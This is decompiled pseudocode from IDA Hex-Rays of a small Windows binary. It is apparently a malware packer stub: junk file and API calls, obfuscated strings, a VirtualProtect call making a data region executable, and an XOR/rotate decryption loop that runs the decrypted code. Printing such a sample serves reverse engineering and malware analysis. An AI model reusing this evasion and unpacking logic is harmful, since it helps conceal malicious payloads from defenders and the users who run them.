/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

HANDLE start();
unsigned int __stdcall sub_411BA1(unsigned int a1, int a2, _DWORD *a3);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// LPSTR __stdcall GetCommandLineA();
// DWORD __stdcall GetLastError();
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// HANDLE __stdcall CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// DWORD __stdcall GetFileType(HANDLE hFile);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);

//-------------------------------------------------------------------------
// Data declarations

int dword_401000[6] = { 1817230996, -726409414, -481893664, 153179550, 808566404, 825155941 }; // weak
_UNKNOWN loc_401027; // weak
_UNKNOWN loc_411A20; // weak
CHAR aN5smnekjrwmj8k[] = "n5SmNEKjrwmj8K68bhOCieFfI.c7r"; // idb
WCHAR aKrp3ca[] = L"\u524B\u2E70\u6333A"; // idb
WCHAR aDfd3fnDst[] = L"\u4664\u3364\u6E46\u642E\u7473"; // idb
CHAR aIjf9wtcJzm[] = "ijF9WTc.jZM"; // idb
CHAR aYuec3fgpjeyz4x[] = "yUEC3fGpjeYz4xLJsMAnB.s53"; // idb
CHAR FileName[] = "rZiSzG4i3aFWqO.C3v"; // idb
CHAR ModuleName[] = "NTDLL.DLL"; // idb
WCHAR a3ukpnjqKgo[] = L"\u7533\u506B\u6A4E\u2E51\u474Bo"; // idb
CHAR aCvrnlxkpslqvol[] = "CvRnLxKpSLQVolurCkugp.3EH"; // idb
CHAR aXppct3uPes[] = "XPPcT3U.Pes"; // idb
WCHAR aAgcwolscQov[] = L"\u4761\u7743\u6C6F\u6373\u512E\u566F"; // idb
WCHAR aXvjymbzekdbgkm[] = L"\u7678\u594A\u626D\u657A\u444B\u4762\u4D6B\u5541\u345A\u6E73\u716B\u7177\u7262\u4E2E\u3862"; // idb
CHAR ProcName[] = "ZwAlertResumeThread"; // idb


//----- (004117BE) --------------------------------------------------------
HANDLE start()
{
  HANDLE result; // eax
  HANDLE v1; // [esp+0h] [ebp-40h]
  HMODULE hModule; // [esp+8h] [ebp-38h]
  HANDLE v3; // [esp+Ch] [ebp-34h]
  HANDLE v4; // [esp+10h] [ebp-30h]
  int v5; // [esp+18h] [ebp-28h]
  HANDLE hFile; // [esp+24h] [ebp-1Ch]
  NTSTATUS (__stdcall *ZwAlertResumeThread)(HANDLE, PULONG); // [esp+2Ch] [ebp-14h]
  HANDLE hObject; // [esp+30h] [ebp-10h]
  HANDLE v9; // [esp+38h] [ebp-8h]
  DWORD flOldProtect; // [esp+3Ch] [ebp-4h] BYREF

  hObject = CreateFileA(FileName, 0x40000000u, 2u, 0, 3u, 0x85u, 0);
  if ( hObject == (HANDLE)-1 )
  {
    GetLastError();
    hFile = CreateFileW(aXvjymbzekdbgkm, 0x40000000u, 1u, 0, 3u, 0xA2u, 0);
    GetLastError();
  }
  do
  {
    CloseHandle(hObject);
    GetCommandLineA();
    v4 = CreateFileW(aAgcwolscQov, 0x80000000, 3u, 0, 3u, 0x122u, 0);
    if ( v4 != (HANDLE)-1 )
      goto LABEL_9;
    GetCommandLineA();
    GetFileType(hFile);
    v1 = CreateFileA(aCvrnlxkpslqvol, 0x80000000, 0, 0, 3u, 0x82u, 0);
  }
  while ( v1 != (HANDLE)-1 );
  CloseHandle(hFile);
  GetFileSize((HANDLE)0xFFFFFFFF, 0);
  GetFileType(hFile);
  GetFileSize(hObject, 0);
  GetLastError();
  GetFileType(hFile);
  hModule = GetModuleHandleA(ModuleName);
LABEL_6:
  GetFileSize(v4, 0);
  while ( 1 )
  {
    GetLastError();
    GetLastError();
    GetFileSize(v1, 0);
    ZwAlertResumeThread = (NTSTATUS (__stdcall *)(HANDLE, PULONG))GetProcAddress(hModule, ProcName);
    CloseHandle(v1);
    CloseHandle(hFile);
    result = CreateFileA(aYuec3fgpjeyz4x, 0x60000000u, 5u, 0, 3u, 0x87u, 0);
    v3 = result;
    if ( result != (HANDLE)-1 )
      return result;
    GetCommandLineA();
    GetFileSize(hFile, 0);
    GetLastError();
    v5 = ((int (__cdecl *)(_DWORD, _DWORD))ZwAlertResumeThread)(0, 0);
LABEL_9:
    GetFileType(hObject);
    CreateFileW(aDfd3fnDst, 0x80000000, 0, 0, 3u, 0xA1u, 0);
    ((void (*)(void))((char *)&loc_411A20 + (v5 ^ 0xC0000008)))();
    v9 = CreateFileA(aIjf9wtcJzm, 0x20000000u, 1u, 0, 3u, 0x103u, 0);
    GetLastError();
    GetLastError();
    if ( CreateFileW(aKrp3ca, 0xA0000000, 4u, 0, 3u, 0x27u, 0) != (HANDLE)-1 )
      goto LABEL_6;
    GetFileSize(v1, 0);
    GetFileSize(v3, 0);
    VirtualProtect(dword_401000, 0x107ACu, 0x40u, &flOldProtect);
    CloseHandle(v9);
    if ( CreateFileA(aXppct3uPes, 0x40000000u, 6u, 0, 3u, 0x180u, 0) == (HANDLE)-1 )
    {
      CreateFileA(aN5smnekjrwmj8k, 0xA0000000, 6u, 0, 3u, 0x103u, 0);
      CreateFileW(a3ukpnjqKgo, 0x80000000, 6u, 0, 3u, 0x23u, 0);
      GetCommandLineA();
      ((void (__cdecl *)(int, int, int *))((char *)sub_411BA1 + v5 + 1073741816))(67500, v5, dword_401000);
      GetCommandLineA();
      return (HANDLE)((int (*)(void))loc_401027)();
    }
  }
}
// 41187F: variable 'hFile' is possibly undefined
// 41193D: variable 'v1' is possibly undefined
// 411943: variable 'hModule' is possibly undefined
// 4119D1: variable 'v5' is possibly undefined
// 411AB2: variable 'v3' is possibly undefined
// 401000: using guessed type int dword_401000[6];

//----- (00411BA1) --------------------------------------------------------
unsigned int __stdcall sub_411BA1(unsigned int a1, int a2, _DWORD *a3)
{
  unsigned int result; // eax

  result = a1 >> 2;
  do
  {
    *a3 ^= a2;
    *a3 ^= 0x85FCFF64;
    *a3 = __ROR4__(*a3, 200);
    *a3 = __ROR4__(*a3, 60);
    *a3 += 88197390;
    *a3 = -*a3;
    *a3++ -= 489679057;
    --result;
  }
  while ( result );
  return result;
}

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
